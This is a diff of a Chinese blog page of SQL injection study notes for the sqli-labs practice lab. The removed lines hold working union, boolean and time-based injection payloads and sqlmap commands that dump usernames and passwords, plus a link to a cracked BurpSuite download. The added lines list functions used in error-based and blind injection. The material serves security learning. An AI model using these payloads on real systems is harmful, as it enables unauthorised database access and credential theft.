@@ -522,45 +522,36 @@
 </li>
 </ol>
 <p>mysql数据库库结构：默认mysql和infomation_schema数据库<br>infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。<br>数据库-&gt;表-&gt;字段-&gt;值</p>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>返回类型：get和post</p>
-<p>数据类型：整型，字符型</p>
-<p>其他类型：…</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔，时间（sleep,benchmark）</p>
-<p>burpsuite工具链接：<a href="https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA" target="_blank" rel="noopener">https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA</a><br>提取码：1mbb<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>
-<p><a href="https://www.cnblogs.com/tynam/p/10089111.html" target="_blank" rel="noopener">破解参考博客</a></p>
-<p><a href="https://www.cnblogs.com/nieliangcai/p/6689915.html" target="_blank" rel="noopener">burpsuite使用参考博客</a></p>
-<h3 id="get基于报错的注入"><a href="#get基于报错的注入" class="headerlink" title="get基于报错的注入"></a>get基于报错的注入</h3><p><strong>Less-1:</strong><br>‘’1’’ LIMIT 0,1’<br>‘1’’ LIMIT 0,1<br>sql: select password,a from admain where id=’’ LIMIT 0,1</p>
-<p><code>手工注入：</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=1' order by 3  --+ ✔判断字段数</span><br><span class="line">联合查询：</span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔123占位</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>解读： 0x3a为 ”:“</p>
-</blockquote>
-<p><code>sqlmap:</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --columns --batch</span><br><span class="line"><span class="meta">#</span><span class="bash">下面(<span class="string">''</span>是错的，要用<span class="string">""</span>或无引号，如下)</span></span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C "password,username" --dump --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C password,username --dump --batch</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>Less-2:</strong><br>‘’ LIMIT 0,1’<br>‘ LIMIT 0,1<br>sql: select * from admain where id=1 limit 0,1</p>
-<p><strong>Less-3：</strong><br>‘’1&#39;) LIMIT 0,1’<br>‘1&#39;) LIMIT 0,1<br>sql: select * from admain where id = (‘1’) limit 0,1</p>
-<p><strong>Less-4:</strong><br>‘“1&quot;) LIMIT 0,1’<br>“1&quot;) LIMIT 0,1<br>sql: select * from  admain where id=(“1”) limit 0,1</p>
-<h3 id="get盲注："><a href="#get盲注：" class="headerlink" title="get盲注："></a>get盲注：</h3><h4 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h4><p><strong>Less-9:</strong></p>
-<p>127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p>
-<p><strong>Less-10:</strong></p>
-<p>127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p>
-<h4 id="基于boolean的盲注："><a href="#基于boolean的盲注：" class="headerlink" title="基于boolean的盲注："></a>基于boolean的盲注：</h4><p><strong>less-8</strong>:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+</span><br><span class="line"><span class="meta">#</span><span class="bash">可接在 and 后</span></span><br><span class="line">stustr(database(),1,1)</span><br><span class="line">asciii(stustr(database(),1,1))=N</span><br></pre></td></tr></table></figure>
-
-<p><code>sqlmap:</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "注入点" --technique T --dbs</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注解： T 基于时间 （sqlmap -h/hh 查询详细）</p>
-<p>Techniques:<br> These options can be used to tweak testing of specific SQL     injection<br> techniques</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH    SQL injection techniques to use (default "BEUSTQ")</span><br></pre></td></tr></table></figure>
-<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
-<p>默认情况下会测试所有的方式，可选择</p>
-</blockquote>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h3><ul>
+<li><p>concat()</p>
+<p>concat(1,2,3) 1,2,3紧挨着</p>
+</li>
+<li><p>concat_ws()<br>concat_ws(“ “,1, 2,3) 1,2,3 用空格分隔</p>
+</li>
+<li><p>updatexml()</p>
+<p> updatexml(1,concat(0x7e,SUBSTR(database(),1,24),0x7e),1) 替换符合条件的文本</p>
+</li>
+<li><p>extractvalue()</p>
+<p> extractvalue(0x0a,concat(0x0a,(select database())))  查找</p>
+</li>
+<li><p>limit </p>
+<p>limit 1,5 检索1后面五个，也就是2-6</p>
+</li>
+</ul>
+<h3 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h3><ul>
+<li><p>length()    </p>
+<p>length(“123456789”)=9 返回字符串长度，输出9</p>
+</li>
+<li><p>left()</p>
+<p>left(”123456789“,5) 提取字符串，从左开始，输出12345 </p>
+</li>
+<li><p>substr()    与此相同的mid(),substring()</p>
+<p>substr(“123456789”, 5, 3) 提取子字符串，输出567</p>
+</li>
+<li><p>ascii()</p>
+<p>ascii(“s”)  返回特定字符的ASCII值 </p>
+</li>
+</ul>
 <h3 id="mysql读写文件："><a href="#mysql读写文件：" class="headerlink" title="mysql读写文件："></a>mysql读写文件：</h3><p>读：</p>
 <blockquote>
 <p>前提：show global variables like “secure_file_priv”;</p>
@@ -769,10 +760,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-10T08:11:21+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-12T13:42:14+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：May 10, 2020</p>
+    <p>更新于：May 12, 2020</p>
   </a>
 </div>
 
@@ -935,7 +926,7 @@
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类"><span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#联合注入"><span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get基于报错的注入"><span class="toc-text">get基于报错的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get盲注："><span class="toc-text">get盲注：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于时间的盲注："><span class="toc-text">基于时间的盲注：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于boolean的盲注："><span class="toc-text">基于boolean的盲注：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql读写文件："><span class="toc-text">mysql读写文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-基于报错"><span class="toc-text">post 基于报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get报错注入-未完善"><span class="toc-text">get报错注入(未完善)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入绕过"><span class="toc-text">sql注入绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-基于时间和布尔值的盲注"><span class="toc-text">post 基于时间和布尔值的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http头中的注入"><span class="toc-text">http头中的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-update语句的注入"><span class="toc-text">post_update语句的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入"><span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64注入"><span class="toc-text">base64注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过去除注释的sql注入"><span class="toc-text">绕过去除注释的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过去除and-or-的sql注入"><span class="toc-text">绕过去除and or 的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过去除空格的sql注入"><span class="toc-text">绕过去除空格的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节的注入"><span class="toc-text">宽字节的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access偏移注入"><span class="toc-text">Access偏移注入</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类"><span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入常用函数"><span class="toc-text">报错注入常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注常用函数"><span class="toc-text">盲注常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql读写文件："><span class="toc-text">mysql读写文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-基于报错"><span class="toc-text">post 基于报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get报错注入-未完善"><span class="toc-text">get报错注入(未完善)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入绕过"><span class="toc-text">sql注入绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-基于时间和布尔值的盲注"><span class="toc-text">post 基于时间和布尔值的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http头中的注入"><span class="toc-text">http头中的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-update语句的注入"><span class="toc-text">post_update语句的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入"><span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64注入"><span class="toc-text">base64注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过去除注释的sql注入"><span class="toc-text">绕过去除注释的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过去除and-or-的sql注入"><span class="toc-text">绕过去除and or 的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过去除空格的sql注入"><span class="toc-text">绕过去除空格的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节的注入"><span class="toc-text">宽字节的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access偏移注入"><span class="toc-text">Access偏移注入</span></a></li></ol></li></ol>
     </div>
   </section>
 
